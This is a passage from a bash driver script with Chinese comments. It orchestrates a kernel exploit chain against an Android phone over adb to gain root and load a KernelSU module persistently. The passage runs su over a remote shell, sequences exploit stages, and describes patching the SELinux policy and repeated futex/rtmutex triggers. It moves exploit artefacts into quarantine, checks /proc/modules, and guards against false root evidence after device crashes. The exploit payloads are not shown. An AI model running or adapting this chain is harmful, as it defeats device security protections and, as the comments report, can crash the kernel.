  KG=$(rsh "${TMPD}/su -c 'sh ${TMPD}/ksu_go.sh'" 150 | tr -d '\r')
  printf '%s\n' "$KG" | tail -12 | while IFS= read -r L; do say "  ksu_go| $L"; done
  # ── v8.34 (2026-10-03 11:0x, 采纳用户提醒的 `.dsh` 先例) ──
  # 先例: 手机上 `.dsh/session_projcache.json` 的 inode/标签坏了 ⇒ getattr/unlink 全 EACCES,
  # **单个文件动不了**, 只能"改名所在目录"隔离, 且无 root 无法修复(存档 L2149-2163)。
  # 我们的坏文件(preload.so / kernelsu_gki209.ko / round_proc_sampler.sh)散在 /data/local/tmp
  # **根下** —— 而那是 exploit 写死的家目录(root_alive/mt49_child_status/ksu_done 都在里面),
  # **不能改名目录** ⇒ 唯一能真正把它们移走的时机就是**现在: root 上下文还活着的时候**。
  if [ "${HASSU:-0}" = "1" ]; then
    CLEAN=$(rsh "${TMPD}/su -c 'K=${TMPD}/quarantine; mkdir -p \$K 2>/dev/null; for f in preload.so kernelsu_gki209.ko round_proc_sampler.sh; do [ -e ${TMPD}/\$f ] || continue; mv -f ${TMPD}/\$f \$K/\$f.bad 2>/dev/null && echo \"quarantined: \$f\" || echo \"quarantine failed: \$f\"; done; ls \$K 2>/dev/null | head -6'" 90 | tr -d '\r')
    printf '%s\n' "$CLEAN" | while IFS= read -r L; do [ -n "$L" ] && say "  quarantine| $L"; done
  fi
  sleep 3
  KN=$(rsh "grep -c ^kernelsu /proc/modules 2>/dev/null" 20 | tr -d '\r ')
  say "ksud 后 /proc/modules: kernelsu=$KN"
  return 0; }

# ── v8.10 阶段顺序 (2026-10-02 21:45, 用户决定) ──
# 默认 **跳过 E5**: 我们的装入路径是 ksud late-load, 而 ksud 自带 SELinux 策略修补
#   (/sys/fs/selinux/policy 第 23 字节 OR 0xC0 + load_policy; gl/gl_middleware_extracted.txt:97-136),
# 靠"改策略授权"而不是"翻 Permissive"; 且 C 成功后我们 SID=kernel, 本就允许加载模块。
# 好处: 每轮省 ~150s; 更重要的是**避免同 boot 的第三次全量爆发** —— 21:39 崩机的嫌疑(H-A′:
# 文档明说历次 panic 都是"对已落地 R-child 的第二次 futex/rtmutex 触发")。
# 需要 E5 时: MATISSE_SKIP_E5=0
if [ "$MATISSE_C_FIRST" = "1" ]; then
  if [ "$MATISSE_SKIP_E5" = "1" ]; then
    say "阶段顺序: R -> C(用满预算) -> ksud   (SKIP_E5=1: ksud 自带策略修补 + 避免第三次爆发)"
    do_c_stage || true
  else
    say "阶段顺序: R -> C(1发) -> E5 -> C(剩余预算) -> ksud   (SKIP_E5=0)"
    do_c_stage 1 || true
    do_e5_stage || true
    do_c_stage 1 || true
  fi
else
  say "阶段顺序: R -> E5 -> C -> ksud   (MATISSE_C_FIRST=0, 旧顺序)"
  do_e5_stage || true
  do_c_stage || true
fi
do_ksud_stage || true

# ── v8.8 传输层死亡守卫 (2026-10-02 21:39 教训) ──
# 那一轮设备在 E5 阶段中途崩机重启, adb 掉线 -> 后续所有 rsh 都返回错误文本,
# 脚本却据此报出 "root_alive=YES / ksu_done=YES / ROOT-ALIVE 证据落盘" —— 全是假判据。
# 所以在出任何结论/写卡片/提交之前, 必须先确认设备还是同一个 boot 且可读。
BEND=$(bootid)
if [ "$BEND" = "READ_FAIL" ] || [ "$BEND" != "$BOOT0" ]; then
  say "!! 设备在阶段中途重启/掉线 (boot $BOOT0 -> $BEND)"
  say "   本轮所有判据不可信 (rsh 会返回错误文本), 按【未成功】处理并停手 — 不看下面的汇总"
  say "   请重启后重跑; 这次开火已消耗"
  exit 6
fi
EFN=$(rsh 'getenforce' 20 | tr -d '
')
# ── v8.31 勘误 (2026-10-03 10:54, 采纳另一会话只读审计) ──
# v8.27 曾在这里断言「09:55 整条链赢了」。事实: 那次**只有 C 那一步的候选证据**,
# `kernelsu 已在 /proc/modules` 是设备掉线时的假阳性(同刻实测 ksu=0), 设备侧 C1.out
# **0 次 finit_module**, 拉回的证据 13 个文件全是 36 字节 adb 错误文本 ⇒ **模块从未装入**。
# 纪律本身是对的, 而且要比"默认值"更硬: 只要本轮摸到**任何** root/模块候选证据,
# 就**熔断 E5R**(它 09:55:40 就在落地 2 秒后把设备打崩) —— 赢下后只读, 绝不再写内核。
if [ "$KN" -ge 1 ] || [ -n "$RA2" ]; then
  say "熔断: 本轮有候选 root/模块证据 -> 强制跳过 E5R (只读; 需要还原可用 MATISSE_SKIP_E5R=0 且自行承担)"
elif [ "${MATISSE_SKIP_E5R:-1}" = "1" ]; then
  say "E5R 已按 v8.27 默认跳过 (赢下后打 E5R 会把设备打崩; 需要时 MATISSE_SKIP_E5R=0)"
elif [ "$EFN" = "Permissive" ]; then
  say "E5R 还原 enforcing..."
  fire E5R1 E5R ""
  say "E5R: enforce=$(rsh 'getenforce' 20 | tr -d '
')"
fi
KSU_FINAL=$(rsh "grep -cE '^(ksu|kernelsu)' /proc/modules 2>/dev/null" 20 | tr -d '
 ')
case "${KSU_FINAL:-0}" in ''|*[!0-9]*) KSU_FINAL=0;; esac   # v8.27: 设备掉线时 rsh 会返回错误文本, 别让 [ -ge ] 报 integer expected
if [ "$KSU_FINAL" -ge 1 ]; then
  say ""
  say "★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★"
  say "★ KSU 已装入内核 (/proc/modules: ksu) - 管理器 v0.9.5 转绿, su 可用 ★"
  say "★ 持久化: 软重启/不重启均保留(内核态模块); 硬重启后重跑本脚本即自动重装 ★"
  say "★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★"
  EXTRA="KSU_LOADED"
else
  say "!! KSU 未装入 (C轮模块=$KMOD). 重启手机后重跑: bash ~/ksu_persist.sh 继续掷"
  EXTRA="KSU_MISS"
fi
# ── 6. 回收 + 判据 + 回传 ──
say "第6步: 回收"
mkdir -p "$WORK/logs_raw/ksu_hunt_$RUN_TS"
for n in R1 R2 R3 R4 R5 R6 E5a E5b C1 E5R1; do
  rsh "cat ${TMPD}/$n.out" 90 > "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out" 2>/dev/null
  [ -s "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out" ] || rm -f "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out"
done
# v8.11 (2026-10-02 22:20): 只把「文件确实存在且非空」的内容当证据。
# 事故: rsh 的报错文本 "cat: ${TMPD}/root_alive.txt: No such file or directory"
# 被写进本地文件 -> [ -s ] 判为「有内容」-> 假 ROOT-ALIVE 证据落盘 (2026-10-02 22:14)。
# 改成让**设备端**先判存在性, 只回传真正的内容。
RA_TXT=$(rsh "if [ -s ${TMPD}/root_alive.txt ]; then head -1 ${TMPD}/root_alive.txt; fi" 20 | tr -d '\r')
KD_TXT=$(rsh "if [ -s ${TMPD}/ksu_done.txt ]; then head -1 ${TMPD}/ksu_done.txt; fi" 20 | tr -d '\r')
printf '%s\n' "$RA_TXT" > "$WORK/logs_raw/ksu_hunt_$RUN_TS/root_alive.txt"
printf '%s\n' "$KD_TXT" > "$WORK/logs_raw/ksu_hunt_$RUN_TS/ksu_done.txt"
KSU_MOD=$(rsh "grep -c ksu /proc/modules" 20 | tr -dc '0-9'); KSU_MOD=${KSU_MOD:-0}
ROOT_ALIVE=$([ -n "$RA_TXT" ] && echo YES || echo no)
KSU_DONE=$([ -n "$KD_TXT" ] && echo YES || echo no)
HN=$(rsh "uname -n" 20 | tr -d '\r' | head -c 40)
ROOT_SEEN=$(grep -ah "ROOT-SEEN.*euid=0" "$WORK/logs_raw/ksu_hunt_$RUN_TS/"*.out 2>/dev/null | head -1)
{ echo "# KSU HUNT 卡 ${RUN_TS}"
  echo "- R11: $R11_GATE / C: $C_FIRED / $EXTRA"
  echo "- 判据: ksu模块=$KSU_MOD root_alive=$ROOT_ALIVE ksu_done=$KSU_DONE hostname=$HN"
  echo "- ROOT-SEEN euid=0: ${ROOT_SEEN:-无}"
  echo "- 终局活体: $(rsh 'getenforce; uname -n' 20 | tr -d '\r' | tr '\n' ' ')"
} > "$WORK/logs_raw/ksu_hunt_$RUN_TS/CARD.md"
cp "$CONSOLE_LOG" "$WORK/logs_raw/ksu_console_${RUN_TS}.log" 2>/dev/null
# 公开版: 不做任何 git 操作。证据全部留在本地 (logs_raw/ 已被 .gitignore 忽略)。
say "证据已留在本地: $WORK/logs_raw/ksu_hunt_$RUN_TS (公开版不提交/不推送)"
PUSHED=0
command -v termux-wake-unlock >/dev/null 2>&1 && termux-wake-unlock 2>/dev/null
say "=========================================="
say "终局: R11=$R11_GATE | C=$C_FIRED | ksu模块=$KSU_MOD | root_alive=$ROOT_ALIVE | ksu_done=$KSU_DONE | host=$HN"
[ "$KSU_MOD" -ge 1 ] 2>/dev/null && say "★★★ KSU 持久 root 完成 ★★★"
[ "$ROOT_ALIVE" = "YES" ] && say "★★★ ROOT-ALIVE 证据落盘 ★★★"
say "本地证据目录: $WORK/logs_raw/ksu_hunt_$RUN_TS"
